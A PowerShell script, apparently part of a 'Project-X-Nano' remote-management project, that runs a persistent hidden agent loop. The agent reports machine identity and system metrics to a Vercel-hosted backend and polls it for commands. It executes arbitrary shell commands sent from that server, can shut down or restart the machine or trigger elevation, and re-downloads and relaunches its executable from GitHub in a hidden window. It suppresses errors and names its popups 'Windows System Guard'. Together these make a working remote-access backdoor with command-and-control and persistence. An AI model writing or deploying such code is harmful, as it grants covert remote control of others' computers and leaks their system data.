# =========================================================================
#  Project-X-Nano Persistent Watchdog & Reverse Cloud Agent Loop
#  Ensures 24/7 reverse connection to Vercel & Neon Postgres Cloud Fleet Hub.
#  Reports real-time CPU, RAM, Battery, OS, Admin status every 15 seconds.
#  Executes queued remote fleet commands with zero port forwarding.
# =========================================================================

param(
    [string]$TargetDir = "",
    [string]$BackendUrl = "https://project-x-alpha-lake.vercel.app"
)

$ErrorActionPreference = "SilentlyContinue"

# 1. Resolve working directory
if (-not $TargetDir -or -not (Test-Path $TargetDir)) {
    $TargetDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (-not (Test-Path $TargetDir)) {
    $TargetDir = "$env:LOCALAPPDATA\Project-X-Nano"
}

$ExePath = Join-Path $TargetDir "Project-X-Nano.exe"
$CfgPath = Join-Path $TargetDir "config.json"
$UnlockFile = Join-Path $TargetDir "uninstalling.lock"

# Read Backend URL from config.json if available
if (Test-Path $CfgPath) {
    try {
        $cfgData = Get-Content $CfgPath -Raw | ConvertFrom-Json
        if ($cfgData.cloud_coordinator_url) {
            $BackendUrl = $cfgData.cloud_coordinator_url.TrimEnd('/')
        }
    } catch {}
}

$GITHUB_RAW_BASE = "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main"
$EXE_URL = "https://github.com/mexxz-01/Project-x-alpha/raw/main/dist/Project-X-Nano.exe"

$computer = $env:COMPUTERNAME
$devName = $computer
$deviceId = "pc_" + ($computer.ToLower() -replace '[^a-z0-9_-]', '_')

function Show-AlertPopup {
    param([string]$Message, [string]$Title = "Windows System Guard")
    try {
        $wshell = New-Object -ComObject Wscript.Shell
        $wshell.Popup($Message, 5, $Title, 48) | Out-Null
    } catch {}
}

function Repair-Files {
    if (Test-Path $UnlockFile) { return }

    if (-not (Test-Path $ExePath) -or (Get-Item $ExePath).Length -lt 100000) {
        try {
            curl.exe -L -s -o "$ExePath" "$EXE_URL"
        } catch {}
    }

    if (-not (Test-Path $CfgPath) -or (Get-Item $CfgPath).Length -lt 10) {
        try {
            curl.exe -L -s -o "$CfgPath" "$GITHUB_RAW_BASE/config.json"
        } catch {}
    }
}

function Send-FleetHeartbeat {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi*','Ethernet*' -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254*" } | Select-Object -First 1).IPAddress
        if (-not $ip) { $ip = "127.0.0.1" }

        # System Metrics
        $cpuLoad = 0
        try {
            $cpuObj = Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average
            $cpuLoad = [math]::Round($cpuObj.Average, 1)
        } catch { $cpuLoad = 0 }

        $ramPercent = 0
        try {
            $osObj = Get-CimInstance Win32_OperatingSystem
            if ($osObj.TotalVisibleMemorySize -gt 0) {
                $ramPercent = [math]::Round((($osObj.TotalVisibleMemorySize - $osObj.FreePhysicalMemory) / $osObj.TotalVisibleMemorySize) * 100, 1)
            }
        } catch { $ramPercent = 0 }

        $batPercent = $null
        try {
            $batObj = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
            if ($batObj) { $batPercent = $batObj.EstimatedChargeRemaining }
        } catch {}

        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $osCaption = (Get-CimInstance Win32_OperatingSystem).Caption
        if (-not $osCaption) { $osCaption = "Windows 11/10" }

        $bodyObj = @{
            id = $deviceId
            name = $devName
            host = $computer
            host_url = $BackendUrl
            tunnel_url = $BackendUrl
            public_url = $BackendUrl
            lan_ip = $ip
            port = 8765
            cpu = $cpuLoad
            ram = $ramPercent
            os = $osCaption
            status = "online"
            metadata = @{
                admin = $isAdmin
                battery = $batPercent
                boot_time = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
                platform = "Windows"
            }
        }

        $bodyJson = $bodyObj | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri "$BackendUrl/api/devices" -Method Post -Body $bodyJson -ContentType "application/json" -TimeoutSec 8 | Out-Null
    } catch {}
}

function Poll-FleetCommands {
    try {
        $pollRes = Invoke-RestMethod -Uri "$BackendUrl/api/commands?device_id=$deviceId&poll=1" -Method Get -TimeoutSec 6
        if ($pollRes.ok -and $pollRes.command) {
            $cmd = $pollRes.command
            $cmdId = $cmd.id
            $cmdAction = "$($cmd.command)".ToLower().Trim()
            $payload = $cmd.payload

            $outText = ""
            $errText = ""

            try {
                if ($cmdAction -eq "exec" -or $cmdAction -eq "shell" -or $cmdAction -eq "terminal") {
                    $rawCmd = if ($payload.cmd) { $payload.cmd } else { $payload.command }
                    if ($rawCmd) {
                        $outText = powershell.exe -NoProfile -Command $rawCmd 2>&1 | Out-String
                    }
                }
                elseif ($cmdAction -eq "power") {
                    $act = if ($payload.action) { $payload.action } else { $payload.act }
                    if ($act -eq "lock") {
                        rundll32.exe user32.dll,LockWorkStation
                        $outText = "Host PC screen locked."
                    } elseif ($act -eq "shutdown") {
                        shutdown.exe /s /t 10 /c "Shutdown dispatched from Project-X-Nano Cloud Hub"
                        $outText = "Host PC shutting down in 10s."
                    } elseif ($act -eq "restart") {
                        shutdown.exe /r /t 10 /c "Restart dispatched from Project-X-Nano Cloud Hub"
                        $outText = "Host PC restarting in 10s."
                    }
                }
                elseif ($cmdAction -eq "elevate") {
                    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -Command Start-Process '$ExePath' -WorkingDirectory '$TargetDir'"
                    $outText = "UAC Elevation triggered."
                }
                else {
                    $outText = "Command '$cmdAction' acknowledged."
                }
            } catch {
                $errText = $_.Exception.Message
            }

            # Return execution result to Cloud Coordinator
            $resBody = @{
                action = "result"
                command_id = $cmdId
                status = if ($errText) { "failed" } else { "completed" }
                result = @{
                    output = $outText
                    error = $errText
                }
            } | ConvertTo-Json -Depth 5

            Invoke-RestMethod -Uri "$BackendUrl/api/commands" -Method Post -Body $resBody -ContentType "application/json" -TimeoutSec 8 | Out-Null
        }
    } catch {}
}

# Initial Heartbeat
Send-FleetHeartbeat

# Main Watchdog & Cloud Loop
$loopCounter = 0

while ($true) {
    if (Test-Path $UnlockFile) {
        break
    }

    # 1. Poll cloud commands every iteration (~3 seconds)
    Poll-FleetCommands

    # 2. Check and restart Project-X-Nano Host Server
    $procServer = Get-Process -Name "Project-X-Nano", "RemotePC" -ErrorAction SilentlyContinue
    $pythonServer = Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%server.py%'" -ErrorAction SilentlyContinue

    if (-not $procServer -and -not $pythonServer) {
        if (-not (Test-Path $UnlockFile)) {
            Repair-Files
            if (Test-Path $ExePath) {
                Start-Process -FilePath "$ExePath" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
            } elseif (Test-Path (Join-Path $TargetDir "server.py")) {
                Start-Process -FilePath "python.exe" -ArgumentList "server.py" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
            }
        }
    }

    # 3. Heartbeat to Cloud every ~15 seconds (every 5 loops of 3s)
    $loopCounter++
    if ($loopCounter -ge 5) {
        $loopCounter = 0
        Send-FleetHeartbeat
        Repair-Files
    }

    Start-Sleep -Seconds 3
}
